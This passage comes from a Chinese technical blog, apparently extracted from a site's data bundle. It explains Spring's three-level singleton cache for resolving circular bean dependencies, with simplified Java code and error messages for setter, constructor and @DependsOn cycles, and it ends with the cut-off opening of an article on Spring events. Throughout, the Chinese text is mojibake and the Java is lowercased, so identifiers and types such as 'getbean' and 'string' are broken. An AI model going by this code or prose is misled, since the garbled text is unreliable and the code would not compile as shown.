singletonobjectsï¼ä¸çº§ç¼å­ï¼æåå¯¹è±¡ï¼ï¼åä¾å¯¹è±¡ç¼å­åºåå­å¨å·²ç»å®å¨åå§ååçåä¾å¯¹è±¡ãå½ç¬¬ä¸æ¬¡ä½¿ç¨ getbean () æ¹æ³è·å bean æ¶ï¼spring ä¼å°è¯ä»è¿ä¸ªç¼å­åºè·åå¯¹è±¡ï¼å¦æè½å¤æ¾å°ï¼åç´æ¥è¿åè¯¥å¯¹è±¡å®ä¾ã\n * earlysingletonobjectsï¼äºçº§ç¼å­ï¼ä»£çå¯¹è±¡ï¼ç¹æ®çæåå¯¹è±¡ï¼ï¼å¦æä¸ä¸ªåä¾å¯¹è±¡éè¦å¼ç¨å¦ä¸ä¸ªåä¾å¯¹è±¡ï¼ä½åèå°æªè¢«å®å¨åå§åï¼é£ä¹å®¹å¨å°åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼proxy objectï¼ï¼å¹¶å°å¶æ¾å° earlysingletonobjects ä¸­ãè¿ä¸ªä»£çå¯¹è±¡ä¼æ´é²ä¸å®éå¯¹è±¡ç¸åçæ¥å£ï¼å¹¶ä¸è½å¤å¯¹å¶è¿è¡ä¸äºåºæ¬æä½ï¼ä½æ¯å®è¿æ²¡æè¢«å®å¨åå§åã\n * singletonfactoriesï¼ä¸çº§ç¼å­ï¼åæåå¯¹è±¡ä¹æ¯å·¥åå¯¹è±¡ï¼ï¼åä¾å·¥åç¼å­åºåå­å¨åå»º bean å®ä¾ç objectfactoryãå¨ bean ä¾èµå³ç³»çåå»ºè¿ç¨ä¸­ï¼å¦æ a ä¾èµ bï¼b åä¾èµ aï¼é£ä¹å¨åå»º a å b çè¿ç¨ä¸­å°±ä¼åºç°å¾ªç¯ä¾èµçé®é¢ãspring å°±æ¯éè¿æåæ´é²ä¸ä¸ªæªå®æåå§åç bean æ¥è§£å³è¿ä¸ªé®é¢çã\n\næç¤º\n\nå¯¹äº spring è®¾è®¡æ²¡æå®å¨çè§£çåå­¦å¯è½å¾é¾æç½ä»¥ä¸çè¯ï¼è¿æ¯éè¦ç¨ä»£ç å ä¸è¯´æï¼ä»¥ä¸æç« ä¼è®®ä»£ç çæ¹å¼å¨ç¨è®²æ¸æ¥\n\n\n# ä»£ç ä»ç»\n\né¦å spring å¨åå§åçæ¶åä¼åæææ bean å è½½å° beandefinition çç¼å­ä¸­ï¼åç»­ææå¯¹ bean çåå»ºé½æ¯ä» beandefinition ä¸­è·åè¯¦ç»å¯ä»¥ç spring æºç éè¯»ï¼ä¸ï¼ ï¼ç¶ååè¿è¡ bean çå½å¨æçè¿ç¨ï¼åå»ºå¥½ bean çå®ä¾æ¾å¥å° singletonobjects ç¼å­ä¸­ï¼ä½æ¯ä»£ç çç¬¬ä¸æ­¥é½æ¯ä»è·åå¼å§ï¼åªæè·åä¸å°ææåå»º\n\n    public object getbean(string name) throws beansexception {\n        return dogetbean(name, null);\n    }\n\n    public object getbean(string name, object... args) throws beansexception {\n        return dogetbean(name, args);\n    }\n\n    public <t> t getbean(string name, class<t> requiredtype) throws beansexception {\n        return (t) getbean(name);\n    }\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        // beanå®ä¾çåå»ºè¿ç¨\n        object bean = docreatebean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nå¯ä»¥çå° getsingleton æ¹æ³å°±æ¯è·ååä¾ï¼ä¸æ¦æåç´æ¥è¿åï¼ä½ç¬¬ä¸æ¬¡è¯å®æ¯æ²¡æçï¼è¯¦ç»çä¸ä»çè·åæ¹å¼\n\n    public object getsingleton(string beanname) {\n        // ä»ä¸çº§ç¼å­ä¸­è·å\n        object singletonobject = singletonobjects.get(beanname);\n        if (null == singletonobject) {\n            singletonobject = earlysingletonobjects.get(beanname);\n            // å¤æ­äºçº§ç¼å­ä¸­æ¯å¦æå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±æ¯ä»£çå¯¹è±¡ï¼å ä¸ºåªæä»£çå¯¹è±¡æä¼æ¾å°ä¸çº§ç¼å­ä¸­\n            if (null == singletonobject) {\n                objectfactory<?> singletonfactory = singletonfactories.get(beanname);\n                if (singletonfactory != null) {\n                    singletonobject = singletonfactory.getobject();\n                    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n                    earlysingletonobjects.put(beanname, singletonobject);\n                    singletonfactories.remove(beanname);\n                }\n            }\n        }\n        return singletonobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ²¡æè·åå°å®ä¾åä» beandefinition ä¸­è·å bean çå®ä¹ä¿¡æ¯è°ç¨ docreatebean åå»º bean çå®ä¾\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // å®ä¾å bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçbeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® bean å±æ§ä¹åï¼åè®¸ beanpostprocessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // ç» bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applypropertyvalues(beanname, bean, beandefinition);\n            // æ§è¡ bean çåå§åæ¹æ³å beanpostprocessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception(\"instantiation of bean failed\", e);\n        }\n        // æ³¨åå®ç°äº disposablebean æ¥å£ç bean å¯¹è±¡\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // å¤æ­ scope_singletonãscope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nå¶ä¸­ applypropertyvalues è¿ä¸ªæ¹æ³ï¼å¯¹è¦åå»ºçå®ä¾è¿è¡å±æ§å¡«åçæ¶åä¼è¿å¥å¾ªç¯ä¾èµçé®é¢ï¼ä¸æ¦éå°æ¯ beanreference ç±»åçï¼åä¼è°ç¨ getbean æ¹æ³å»è·åå®ä¾ï¼è¯¥æ¹æ³åä¼åå°ä¸é¢çæ¹æ³ã\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            // è¿éè·åå°  bean ä¿¡æ¯éçå±æ§æåªäºï¼ä¹å°±æ¯ä¸ä¸ªå¯¹è±¡æåªäºå±æ§ï¼å¹¶å¾ªç¯èµå¼å°æåå»ºå®ä¾çå±æ§ä¸­å»\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a ä¾èµ bï¼è·å b çå®ä¾å\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // ç±»åè½¬æ¢ï¼ä¸æ¯ä¾§éç¹å¯ä»¥ä¸ç\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception(\"error setting property valuesï¼\" + beanname + \" messageï¼\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå½ä¸ä¸ªå®ä¾çåå»ºåºæ¬å®æï¼ä»ä¼æèªå·±æ·»å å°ä¸çº§ç¼å­å¯¹è±¡ï¼åä¸ºä¸ä¸ªæåæä¾ç»å¶ä»æ¹æ³ä½¿ç¨ãå¦ä¸æ¹æ³å°±æ¯æ·»å å°ä¸çº§ç¼å­çè¿ç¨ï¼å¶ä¸­ getsingleton å¨è·åä¸çº§ç¼å­æ°æ®å°äºçº§ç¼å­çæ¶åä¼æ§è¡ singletonfactory.getobject (); è¿æ¯ä¸ä¸ªæ¹æ³ï¼ä¼å»æ§è¡ getearlybeanreference (beanname, beandefinition, finalbean) æ¹æ³ï¼è¯¥æ¹æ³ä¼å¾å°å·¥åæ¹æ³éé¢çä¸ä¸ªä»£çå¯¹è±¡ãç¶ååæä»£çå¯¹è±¡å­å°ä¸çº§ç¼å­ãè³æ­¤ bean çå®ä¾åå°ç¼å­çè¿ç¨å°±ç»æã\n\n// å¤æ­ scope_singletonãscope_prototype\nobject exposedobject = bean;\nif (beandefinition.issingleton()) {\n    // æä¸çº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºäºçº§ç¼å­å¯¹è±¡\n    exposedobject = getsingleton(beanname);\n    // æäºçº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºä¸çº§ç¼å­å¯¹è±¡\n    registersingleton(beanname, exposedobject);\n}\n\n// getsingleton çé¨åä»£ç å®ç°\nobjectfactory<?> singletonfactory = singletonfactories.get(beanname);\nif (singletonfactory != null) {\n    // è·åä»£çå¯¹è±¡\n    singletonobject = singletonfactory.getobject();\n    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n    earlysingletonobjects.put(beanname, singletonobject);\n    singletonfactories.remove(beanname);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# æµç¨ä»ç»\n\næäºå®æ´çæ¦å¿µåï¼æä»¬å¯ä»¥èèå¾ªç¯ä¾èµçå­å¨ï¼å½ a ä¾èµ bï¼b åä¾èµ aï¼é£ä¹è§£å³ä¾èµçè¿ç¨åæ¯å¦ä½åçï¼å¯ä»¥çä¸å¾ï¼\n\n\n\n 1. ä¼åå¨ getbean æ¹æ³éé¢æ¾ aï¼éè¿ä¸äºä¸çº§ç¼å­ä¸­å¯»æ¾ï¼å¦ææ¾å°åç´æ¥è¿å\n 2. æ²¡æ¾å°å°±å»åå»º a å¹¶æ¾å¥ singletonfactories ä¸çº§ç¼å­ï¼ä¼å¯¹ a çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ a çå±æ§ä¾èµäº bï¼å°±è¦è°ç¨ getbean æ¾ b\n 3. éè¿å¨ getbean ç ä¸äºä¸çº§ç¼å­æ¥æ¾ï¼å¦ææ¾å°äºç´æ¥è¿å\n 4. æ²¡æ¾å°å°±å»åå»º b å¹¶æ¾å¥ singletonfactories ä¸çº§ç¼å­ï¼ä¼å¯¹ b çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ b çå±æ§ä¾èµäº aï¼å°±è¦è°ç¨ getbean æ¾ a\n 5. æ­¤æ¶ç a å·²ç»å¨ä¸çº§ç¼å­ï¼å¯ä»¥å¨ä¸çº§ç¼å­ä¸­æ¾å°ï¼æ¾å°åä¼çæ a ä»£çå¯¹è±¡ æ¾å¥ earlysingletonobjects äºçº§ç¼å­å¹¶è¿åè¿ä¸ªä»£çå¯¹è±¡\n 6. b æäºå±æ§ a çä»£çå¯¹è±¡ï¼æ­¤æ¶ b ææå±æ§å¡«åå®æ¯åï¼å°±è¦æ b æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç b å¨ä¸çº§ç¼å­ï¼ä¼åæä¸çº§ç¼å­å¯¹è±¡çæä»£çåæ¾å¥å° earlysingletonobjects äºçº§ç¼å­ï¼åç±äºçº§ç¼å­æå¯¹è±¡æ¾å° singletonobjects ä¸çº§ç¼å­å¯¹è±¡\n 7. æ­¤æ¶ç b å·²ç»æ¾å°ä¸çº§ç¼å­å¯¹è±¡äºï¼å¹¶ç»æäº b çåå»ºæµç¨ï¼æä»¥ä¼è¿åå°ç¬¬ 2 æ­¥ï¼a å°±æäº b çå®ä¾ï¼a çå±æ§å¡«åå®æ¯åï¼å°±è¦æ a æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç a å·²ç»å¨äºçº§ç¼å­ï¼æä»¥å°±å¯ä»¥ç´æ¥æ¾å¥å° singletonobjects ä¸çº§ç¼å­\n\nç°å¨æä»¬ç¥éï¼æç§ spring æ¡æ¶çè®¾è®¡ï¼ç¨äºè§£å³å¾ªç¯ä¾èµéè¦ç¨å°ä¸ä¸ªç¼å­ï¼è¿ä¸ä¸ªç¼å­åå«å­æ¾äº singletonobjects æåå¯¹è±¡ãsingletonfactories åæåå¯¹è±¡ (æªå¡«åå±æ§å¼)ãearlysingletonobjects ä»£çå¯¹è±¡ï¼åé¶æ®µå­æ¾å¯¹è±¡åå®¹ï¼æ¥è§£å³å¾ªç¯ä¾èµé®é¢ã\n\né£ä¹ï¼è¿éæä»¬éè¦ç¥éä¸ä¸ªæ ¸å¿çåçï¼å°±æ¯ç¨äºè§£å³å¾ªç¯ä¾èµå°±å¿é¡»æ¯ä¸çº§ç¼å­å¢ï¼äºçº§è¡åï¼ä¸çº§å¯ä»¥ä¸ï¼å¶å®é½è½è§£å³ï¼åªä¸è¿ spring æ¡æ¶çå®ç°è¦ä¿è¯å ä¸ªäºæï¼å¦åªæä¸çº§ç¼å­å¤çæµç¨æ²¡æ³æåï¼å¤æåº¦ä¹ä¼å¢å ï¼åæ¶åæåå¯¹è±¡å¯è½ä¼æç©ºæéå¼å¸¸ãèå°åæåä¸æåå¯¹è±¡åå¼ï¼å¤çèµ·æ¥ä¹æ´å ä¼éãç®åãææ©å±ãå¦å¤ spring çä¸¤å¤§ç¹æ§ä¸­ä¸ä»æ ioc è¿æ aopï¼ä¹å°±æ¯åºäºå­èç å¢å¼ºåçæ¹æ³ï¼è¯¥å­æ¾å°åªï¼èä¸çº§ç¼å­æä¸»è¦ï¼è¦è§£å³çå¾ªç¯ä¾èµå°±æ¯å¯¹ aop çå¤çï¼ä½å¦ææ aop ä»£çå¯¹è±¡çåå»ºæåï¼é£ä¹äºçº§ç¼å­ä¹ä¸æ ·å¯ä»¥è§£å³ãä½æ¯ï¼è¿å°±è¿èäº spring åå»ºå¯¹è±¡çååï¼spring æ´åæ¬¢æææçæ®é bean é½åå§åå®æï¼å¨å¤çä»£çå¯¹è±¡çåå§åã\n\nä¸ä¸ªåä¸ªç¼å­è§£å³å¾ªç¯ä¾èµçä¾å­\n\npublic class forrelyon {\n\n    static map<string,object> singletonobjects = new hashmap<>();\n\n    public static void main(string[] args) throws exception {\n        system.out.println(getbean(a.class).getb());\n        system.out.println(getbean(b.class).geta());\n    }\n\n    private static <t> t getbean(class<t> beanclass) throws exception {\n        string beanname = beanclass.getsimplename().tolowercase();\n        if (singletonobjects.containskey(beanname)) {\n            return (t) singletonobjects.get(beanname);\n        }\n        // å®ä¾åå¯¹è±¡å¥ç¼å­0\n        object obj = beanclass.newinstance();\n        singletonobjects.put(beanname, obj);\n        // å±æ§å¡«åè¡¥å¨å¯¹è±¡\n        field[] fields = obj.getclass().getdeclaredfields();\n        for (field field : fields) {\n            field.setaccessible(true);\n            class<?> fieldclass = field.gettype();\n            string fieldbeanname = fieldclass.getsimplename().tolowercase();\n            field.set(obj, singletonobjects.containskey(fieldbeanname) ? singletonobjects.get(fieldbeanname) : getbean(fieldclass));\n            field.setaccessible(false);\n        }\n        return (t) obj;\n    }\n\n\n    static class a{\n        private b b;\n\n        public b getb() {\n            return b;\n        }\n\n        public void setb(b b) {\n            this.b = b;\n        }\n    }\n\n    static class b{\n        private a a;\n\n        public a geta() {\n            return a;\n        }\n\n        public void seta(a a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\næç¤º\n\nä»¥ä¸é½æ¯æä»¬éè¿ åä¾ç set æ³¨å¥æ¹å¼æ¥è§£å³å¾ªç¯ä¾èµï¼å¨ spring ä¸­æå¤ç§å¤æ ·çæ³¨å¥æåµï¼é£ä¼å¸¦æ¥ä»ä¹æ ·çæåµå¢ï¼\n\n\n# ä¸åçå¾ªç¯ä¾èµé®é¢\n\n\n# set å¾ªç¯ä¾èµ\n\nå¨å¤ä¾ set çå¾ªç¯ä¾èµä¸­ï¼åªæå¤ä¾åå¤ä¾å¾ªç¯ä¾èµä¼åºç°æ¥éï¼æ¥éä¿¡æ¯å¦ä¸ï¼\n\nerror creating bean with name 'b': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'a': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n\n\nå¤ä¾ååä¾çå¾ªç¯ä¾èµä¸ä¼æé®é¢ï¼å¦ä¸æ¯ä¸ä¸ªåä¾åå¤ä¾çå¾ªç¯ä¾èµä»£ç ï¼\n\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@scope(configurablebeanfactory.scope_prototype)\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n\npublic static void main(string[] args) {\n    configurableapplicationcontext run = springapplication.run(adminapplication.class, args);\n    b b = run.getbean(b.class);\n    b b1 = run.getbean(b.class);\n    b b2 = run.getbean(b.class);\n    a a = run.getbean(a.class);\n    a a1 = run.getbean(a.class);\n    a a2 = run.getbean(a.class);\n    system.out.println(b);\n    system.out.println(b1);\n    system.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// ç»æ\n// com.wt.admin.controller.b@1e5e2e06\n// com.wt.admin.controller.b@26c1f3eb\n// com.wt.admin.controller.b@79982bcc\n// com.wt.admin.controller.b@16b2d182\n// com.wt.admin.controller.b@16b2d182\n// com.wt.admin.controller.b@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# æé å¨ å¾ªç¯ä¾èµ\n\nä½å¨ æé å¨ å¾ªç¯ä¾èµçæ³¨å¥ä¸­ï¼å ä¸ºå¨æé å¨æ³¨å¥æ¹å¼ä¸ï¼éè¦ååå»ºä¸ä¸ª bean å¯¹è±¡ï¼ç¶ååå°å¶ä» bean æ³¨å¥è¯¥å¯¹è±¡ä¸­ãä½æ¯ï¼å¦æä¸¤ä¸ª bean é½äºç¸ä¾èµï¼é£ä¹å°±ä¼åºç°æ æ³åå»ºä»»ä½ä¸ä¸ª bean çæåµãå æ­¤ï¼spring å¨è¿ç§æåµä¸ä¼æåºå¼å¸¸ä»¥é¿åç¨åºåºç°ä¸å¯é¢æµçéè¯¯ã\n\n@configuration\npublic class config {\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥é\n// the dependencies of some of the beans in the application context form a cycle:\n// âââââââ\n// |  a defined in class path resource [com/wt/admin/controller/config.class]\n// â     â\n// |  b defined in class path resource [com/wt/admin/controller/config.class]\n// âââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè§£å³è¿ç§é®é¢ï¼å¯ä»¥éè¿å¨æ¹æ³ä¸­æ·»å  @lazy æ³¨è§£ï¼åªè½å å°æ¹æ³éï¼ä¸è½å å° @bean çä¸ä¸ä½ç½®ï¼å¦åä¾ç¶ä¼æ¥å¾ªç¯ä¾èµï¼è¿ç§æ¹å¼å°½å¯è½çè¢«å®ä¹ä¸º @lazy ç bean å¨ç¬¬ä¸æ¬¡è¢«ä½¿ç¨çæ¶åå¨å»è¿è¡å®ä¾åã\n\næé å¨ä¹å­å¨å¤ä¾ååä¾çé®é¢ï¼å¦æä½ æ¯å¤ä¾ä¾èµå¾ªç¯ï¼ä¼æ¥éï¼å¦ä¸\n\n// å¤ä¾\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥éä¿¡æ¯\n// error creating bean with name 'b' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æä½ æ¯å¤ä¾ååä¾å¾ªç¯ä¾èµï¼ä¹ä¼æ¥éï¼ä½è¿éåæä»¬ä½¿ç¨æ³¨è§£è¿è¡å¤ä¾ååä¾çå¾ªç¯ä¾èµæµè¯ç»æå°±ææä¸åäº\n\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥éä¿¡æ¯\n// the dependencies of some of the beans in the application context form a cycle:\n// âââââââ\n// |  b defined in class path resource [com/wt/admin/controller/config.class]\n// â     â\n// |  a defined in class path resource [com/wt/admin/controller/config.class]\n// âââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né£ä¹æé å¨å set æ³¨å¥çæ¹å¼å¨å¤ä¾ååä¾çç»è®ºå¦ä¸ï¼\n\n * åä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n * å¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼set æ³¨å¥çæ¹å¼ä¼æ¥éï¼ä¸¤èé½æ¯è°ç¨å¯¹è±¡æ¶ææ¥\n * åä¾åå¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n\n\n# @dependson\n\n@dependson æ³¨è§£å¯ä»¥å®ä¹å¨ç±»åâ½æ³ä¸ï¼æææ¯æè¿ä¸ªç»ä»¶è¦ä¾èµäºå¦â¼ä¸ªç»ä»¶ï¼ä¹å°±æ¯è¯´è¢«ä¾èµçç»ä»¶ä¼â½è¯¥ç»ä»¶åæ³¨åå° ioc å®¹å¨ä¸­ãå¦ä¸æ¡ä¾ï¼å ä¸ºä¸¤ä¸ªé½è¦åäºï¼æä»¥é æäºå¾ªç¯ä¾èµ\n\n@dependson(\"b\")\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@dependson(\"a\")\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n// æ¥é\n// error creating bean with name 'b' defined in file [d:\\workspace\\luckydraw\\java\\target\\classes\\com\\wt\\admin\\controller\\b.class]: circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ äºä»¶éç¥",frontmatter:{title:"æ ¸å¿åå®¹æè§£ äºä»¶éç¥",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/202.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/202.æ ¸å¿åå®¹æè§£ äºä»¶éç¥.md",key:"v-7ee2cada",path:"/spring/spring/202/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'å¨ Spring æ¡æ¶ä¸­ï¼Event ä»£è¡¨çä¸ä¸ªåºç¨ç¨åºä¸­çäºä»¶ãè¿äºäºä»¶å¯ä»¥æ¯ä»»ä½ç±»åçç¶æååï¼å¦ç¨æ·æä½ãæ°æ®æ´æ°åç³»ç»éè¯¯ç­ç­ãæä»¬å¯ä»¥ä½¿ç¨ Event æ¥å®ç°åºç¨ç¨åºåé¨çéä¿¡ååä½ãéè¿è§å¯èæ¨¡å¼ï¼æä»¬å¯ä»¥è®©ä¸åçç»ä»¶å¨ç¹å®çäºä»¶åçæ¶ååºååºï¼ä»èå®ç°æ¾è¦åçè®¾è®¡ã\n\nSpring æä¾äºä¸ä¸ªç®åèå¼ºå¤§çæºå¶æ¥å¤ç Eventï¼å³ ApplicationEvent å ApplicationListener æ¥å£ãApplicationEvent æ¯ä¸ä¸ªåºæ¬çäºä»¶ç±»ï¼å®å¯ä»¥è¢«ç»§æ¿ä»¥å®ç°åç§ç±»åçäºä»¶ãApplicationListener æ¥å£åå®ä¹äºä¸ä¸ªçå¬å¨ï¼å¨æä¸ªäºä»¶åçæ¶è§¦ååè°æ¹æ³ãä»¥ä¸æä¾äºåºæ¬çç±»å¾å³ç³»ï¼å¶ä¸­ AbstractApplicationContext æ¯æ§è¡ Spring æææ ¸å¿æ¹æ³çéæç±»ï¼\n\n\n\nSpring æä¾äºè®¸å¤ä¸åç±»åç Eventï¼æ¯ç§ Event é½æå¶ç¹å®çä½ç¨åç¨éãä¸é¢æ¯ Spring çå½å¨æä¸­æä¾ç Event åå¶ä½ç¨ï¼\n\n * ContextRefreshedEventï¼è¡¨ç¤º ApplicationContext å·²ç»åå§åå¹¶ä¸åå¤å¥½æ¥åè¯·æ±ãéå¸¸æåµä¸ï¼æä»¬å¯ä»¥å©ç¨è¯¥äºä»¶æ¥è¿è¡ä¸äºåå§åæä½ã\n * ContextStartedEventï¼è¡¨ç¤º ApplicationContext æ­£å¨å¯å¨ãå½åºç¨ç¨åºä¸­æéè¦å¨å¯å¨æ¶æ§è¡çæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶è¿è¡å¤çã\n * ContextStoppedEventï¼è¡¨ç¤º ApplicationContext å·²åæ­¢ãå½éè¦å¨åºç¨ç¨åºåæ­¢åæ§è¡æäºæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶ã\n * ContextClosedEventï¼è¡¨ç¤º ApplicationContext å·²ç»å³é­ãä¸ ContextStoppedEvent ä¸åï¼ContextClosedEvent æ¯å¨ ApplicationContext å³é­ä¹ååéçï¼å®åè®¸æä»¬å¯¹èµæºè¿è¡å®å¨éæ¾ã\n * RequestHandledEventï¼è¡¨ç¤ºä¸ä¸ª HTTP è¯·æ±å·²ç»è¢«å¤çå®æ¯ãè¯¥äºä»¶éå¸¸ç¨äºè®°å½æç»è®¡è¯·æ±å¤ççæ§è½æ°æ®ã\n\nå¨ Spring ä¸­ï¼æä»¬å¯ä»¥éè¿å®ç° ApplicationListener æ¥å£æä½¿ç¨ @EventListener 